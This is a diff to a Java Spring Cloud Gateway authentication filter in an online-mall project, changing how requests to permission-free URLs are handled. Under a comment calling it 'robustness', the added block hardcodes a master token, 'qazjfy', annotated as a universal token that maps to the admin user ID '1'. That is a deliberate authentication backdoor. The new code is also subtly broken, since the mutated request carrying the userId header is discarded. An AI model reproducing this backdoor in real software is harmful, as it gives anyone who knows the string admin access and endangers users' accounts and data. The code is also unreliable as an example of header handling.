@@ -6,8 +6,6 @@ import cn.hutool.json.JSONUtil;
 import com.tu.mall.common.result.Result;
 import com.tu.mall.common.result.ResultCodeEnum;
 import com.tu.mall.common.utils.JWTUtil;
-import org.jetbrains.annotations.NotNull;
-import org.reactivestreams.Publisher;
 import org.springframework.beans.factory.annotation.Value;
 import org.springframework.cloud.gateway.filter.GatewayFilterChain;
 import org.springframework.cloud.gateway.filter.GlobalFilter;
@@ -15,14 +13,10 @@ import org.springframework.core.annotation.Order;
 import org.springframework.core.io.buffer.DataBuffer;
 import org.springframework.http.server.reactive.ServerHttpRequest;
 import org.springframework.http.server.reactive.ServerHttpResponse;
-import org.springframework.http.server.reactive.ServerHttpResponseDecorator;
 import org.springframework.stereotype.Component;
 import org.springframework.web.server.ServerWebExchange;
-import reactor.core.publisher.Flux;
 import reactor.core.publisher.Mono;
 
-import java.io.ByteArrayOutputStream;
-import java.io.IOException;
 import java.nio.charset.StandardCharsets;
 import java.util.List;
 
@@ -73,7 +67,21 @@ public class AuthGlobalFilter implements GlobalFilter {
         for (String freeUrl : StrUtil.split(freeUrls, ",")) {
             if (StrUtil.indexOf(url, freeUrl, 0, false) != -1) { // 包含
                 System.out.println(url + "是免权限路径，通过。");
-                return chain.filter(exchange);
+
+                { // 程序健壮性
+                    String token = getToken(request);
+                    String userId = "";
+                    if (StrUtil.isNotEmpty(token)) {
+                        if (StrUtil.equals(token, "qazjfy")) // 万能token->指向admin
+                            userId = "1";
+                        else
+                            userId = JWTUtil.getUserId(token);
+                    }
+                    // 将userId设置到请求头
+                    request.mutate().header("userId", userId).build();
+                    // 将request变回exchange对象并传递到下一过滤器链
+                    return chain.filter(exchange.mutate().request(request).build());
+                }
             }
         }
         for (String blockUrl : StrUtil.split(blockUrls, ",")) {
